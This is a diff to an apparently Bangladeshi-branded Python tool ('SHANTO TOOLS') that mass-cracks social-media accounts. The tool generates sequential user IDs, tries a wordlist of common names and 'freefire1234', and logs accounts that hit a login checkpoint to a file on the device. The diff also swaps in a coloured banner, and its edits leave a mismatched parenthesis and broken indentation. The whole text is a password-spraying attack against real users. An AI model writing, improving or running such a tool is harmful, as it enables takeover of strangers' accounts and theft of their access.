@@ -12,8 +12,20 @@ except ModuleNotFoundError:
         os.system(f'pip install requests futures==2 > /dev/null')
 except:pass
 logo = """ 
-HELLO WORLD
-"""
+\033[1;33m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;32m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;36m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+                                                 
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
+
+\033[1;92m══════════════════════════════════════════
+\033[1;32m[-] TOOLS TYPE:\033[1;32m PRIVATE
+\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO 
+\033[1;32m[-] GITHUB    :\033[1;32m SHANTO
+\033[1;32m[-] FACEBOOK  :\033[1;32m SH AN TO
+\033[1;92m══════════════════════════════════════════
+
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SHANTO BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 ok = []
 cp = []
 id = []
@@ -60,8 +72,8 @@ def Main():
 		print('<> CRACK STARTED....... ')
 		print(50*'━')
 		for guru in user:
-			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
+			uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
 			yaari.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
@@ -122,8 +134,8 @@ def test(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;92m[T-C-404-CP] {uid} ¤ {ps}")
-                open('/sdcard/T-C-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\r\33[1;92m[T-C-404-CP] {cid} ¤ {ps}")
+                open('/sdcard/T-C-404-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
